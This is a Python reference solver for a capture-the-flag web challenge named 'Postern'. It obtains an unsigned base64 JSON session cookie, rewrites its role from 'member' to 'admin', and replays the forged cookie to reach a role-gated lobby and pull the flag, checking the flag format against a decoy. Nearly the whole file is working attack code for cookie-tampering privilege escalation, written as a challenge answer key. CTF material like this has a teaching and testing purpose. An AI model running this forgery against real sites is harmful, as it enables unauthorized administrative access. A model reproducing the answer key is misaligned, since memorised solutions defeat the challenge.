#!/usr/bin/env python3
"""
ZSCTF :: Postern -- reference solver (standalone; stdlib only).

Intended path (exploits only what is in plain sight in challenge/app.py):

  1. POST /login to receive a `session` cookie. It is URL-safe base64 of a small
     JSON object, e.g. {"uid":1007,"user":"guest","role":"member"} -- NOT signed.
  2. Decode it, change "role" to "admin", re-encode it.
  3. GET /lobby with the tampered cookie. The server trusts the role claimed by
     the cookie, so it serves the administrators' lobby, which contains the flag.

Integrity: accept only a flag served by the live admin lobby
(header X-Flag-Source: live-admin) that matches the published format
^zerosecurectf\\{[a-z0-9_]+\\}$. The staging banner decoy ("zer0securectf{...}")
fails that format and is rejected.

Usage:
    python solve.py --url http://127.0.0.1:8000
"""
import sys
import re
import json
import base64
import argparse
import urllib.request
import urllib.error

FLAG_RE = re.compile(r"^zerosecurectf\{[a-z0-9_]+\}$")
FLAG_IN_PAGE = re.compile(r"zerosecurectf\{[a-z0-9_]+\}")


def b64url_decode(value):
    pad = "=" * (-len(value) % 4)
    return base64.urlsafe_b64decode(value + pad)


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).decode("ascii")


def http(url, method="GET", data=None, headers=None):
    req = urllib.request.Request(url, data=data, method=method,
                                 headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")


def get_session_cookie(base):
    """POST /login and return the raw `session` cookie value the server set."""
    body = b"user=guest"
    # Do not follow the 303 redirect: we only want the Set-Cookie it returns.
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    req = urllib.request.Request(base + "/login", data=body, method="POST",
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        resp = opener.open(req, timeout=15)
        set_cookie = resp.headers.get("Set-Cookie", "")
    except urllib.error.HTTPError as e:
        set_cookie = e.headers.get("Set-Cookie", "")
    m = re.search(r"session=([^;]+)", set_cookie)
    if not m:
        raise SystemExit("[-] server did not issue a session cookie: %r" % set_cookie)
    return m.group(1)


def solve(base):
    base = base.rstrip("/")

    # 1. Get an ordinary member session cookie.
    cookie = get_session_cookie(base)
    sess = json.loads(b64url_decode(cookie).decode("utf-8"))
    print("[*] issued session: %s" % sess)
    assert sess.get("role") == "member", "expected a member session to start with"

    # 2. The cookie is unsigned -- promote ourselves to admin.
    sess["role"] = "admin"
    forged = b64url_encode(json.dumps(sess, separators=(",", ":"), sort_keys=True).encode())
    print("[*] forged admin session: %s" % sess)

    # 3. Visit the role-gated lobby with the tampered cookie.
    st, hdrs, page = http(base + "/lobby", headers={"Cookie": "session=" + forged})
    src = hdrs.get("X-Flag-Source", "<none>")

    m = FLAG_IN_PAGE.search(page)
    if not m:
        raise SystemExit("[-] no valid-format flag in admin lobby (status=%s):\n%s"
                         % (st, page[:400]))
    flag = m.group(0)

    # Integrity: it must come from the live admin area and match the format.
    if src != "live-admin":
        raise SystemExit("[-] flag not served by live admin area (source=%s)" % src)
    if not FLAG_RE.match(flag):
        raise SystemExit("[-] candidate fails the published format rule: %s" % flag)

    print("[+] admin lobby served the flag (X-Flag-Source=%s)" % src)
    return flag


def main():
    ap = argparse.ArgumentParser(description="Postern reference solver (client-trusted cookie role).")
    ap.add_argument("--url", required=True, metavar="http://HOST:PORT",
                    help="base URL of the running Postern service")
    args = ap.parse_args()
    try:
        flag = solve(args.url)
    except OSError as e:
        print("[-] network error talking to %s: %s" % (args.url, e))
        return 1
    print("[+] FLAG =", flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
